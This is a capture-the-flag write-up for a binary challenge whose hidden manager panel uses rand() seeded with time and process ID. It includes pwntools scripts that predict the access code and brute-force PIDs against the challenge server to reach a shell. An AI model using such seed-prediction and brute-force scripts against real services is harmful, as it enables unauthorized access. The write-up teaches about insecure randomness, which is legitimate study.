# 5. Hungry

## Solution:

Analyzing the decompiled of the program we can understand how it works, the `main()` function mainly calls `take_order()` and `choose_style()`.

`take_order()` asks 24 y/n questions for ingridents and builds a bitmask of the chosen ones. But is `$` is entered, then `manager_control_panel()` is called.

`manager_control_panel()` seeds PRNG with `time(0) ^ getpid()` and `rand() % 1000000` generated the code. If we enter the right code, the program runs  `/bin/bash` which leads us to the flag.

We can exploit this program by entering `$` when take_order() is called, locally we can use a python script to recreate the seeding used to get the code using `time.time()` and PID from pwntools.

Here is the python script used -
```
from pwn import *
import time
from ctypes import CDLL
from ctypes.util import find_library

L=CDLL(find_library("c"))
E=ELF("./burgers_are_mid")
p=process("./burgers_are_mid")

d=p.recvuntil(b"(y/n)?")
print(d)

p.sendline(b"$")

t=int(time.time())
pp=p.pid
print("t=",t,"pid=",pp)

s=t^pp
L.srand(s)
c=L.rand()%1000000
print("code =",c)

x=p.recvuntil(b":")
print(x)

p.sendline(str(c).encode())

print(p.recvline(timeout=1))
p.interactive()

```

Executing this code gives us -

```

$ cat flag.txt
nite{fake_flag}
```

To get the actual flag, we can just brute force the pid, taking the limit to be `65536` since the integer reaches limit there. I made a python script again.
```
from pwn import *
import time
from ctypes import CDLL
from ctypes.util import find_library
import random

libc = CDLL(find_library("c"))

t = int(time.time())

i = t
while i < t + 5:
    j = 0
    while j < 65536:
        seed = i ^ j
        libc.srand(seed)
        access_code = libc.rand() % 1000000

        p = remote('hunger.nitephase.live', 53791)

        p.sendline(b'$')
        p.sendline(bytes(str(access_code), 'ascii'))

        if b'Incorrect' in p.recv():
            p.close()
        elif b'Access' in p.recv():
            p.interactive()
            break

        j += 1
    i += 1

```

Executing this gives us the final flag.

## Flag:

```
nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
```

## Concepts learnt:

- Learnt that functions like rand() are not truly random.
- Learnt how even seemingly secure systems like using time and pid, are vulnerable to being cracked.

- NONE
